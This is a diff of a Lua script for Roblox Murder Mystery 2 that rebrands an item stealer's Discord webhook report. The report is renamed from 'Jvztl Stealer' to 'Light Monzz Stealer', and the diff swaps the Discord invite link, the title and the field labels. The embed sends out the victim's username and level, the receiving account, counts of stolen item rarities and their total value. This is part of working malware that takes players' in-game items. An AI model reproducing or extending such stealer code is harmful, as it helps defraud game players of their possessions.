@@ -1060,17 +1060,17 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Common\n" .. commonsString
 
 local WebHookEmbed = CreateEmbed(
-    "ðŸ”ª Join to get MM2 hit",
+    "MM2 Hit - Ft. Light Monzz",
     "",
-    11220,
+    3111251,
     {
         {
-            name = "```Info```", 
-            value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl())..
-                     "\nReceiver: "..userName.."```"
+            name = "ðŸŽ­ Player Info", 
+            value = "```ðŸ“– Username: "..LP.Name.."\nðŸš€ Level: "..tostring(getLvl())..
+                     "\nðŸ’» Receiver: "..userName.."```"
         },
         {
-            name = "```Hit Info```", 
+            name = "ðŸ“Œ Items Data", 
             value = "```Uniques: "..tostring(uniqueItemsC)..
                      "\nAncients: "..tostring(ancientItemsC)..
                      "\nGodlys: "..tostring(godlyItemsC)..
@@ -1081,12 +1081,12 @@ local WebHookEmbed = CreateEmbed(
                      "\nCommons: "..tostring(commonItemsC).."```"
         },
         {
-            name = "```Summary```", 
-            value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."```"
+            name = "ðŸŽ‰ Total Value", 
+            value = "```"..tostring(math.floor(valueCount + 0.5)).."```"
         },
         {
-            name = "```Jvztl Stealer```", 
-            value = "https://discord.gg/qcsZfTRKJA"
+            name = "Light Monzz Stealer", 
+            value = "https://discord.gg/CAr4FZHAyF"
         }
     }
 )
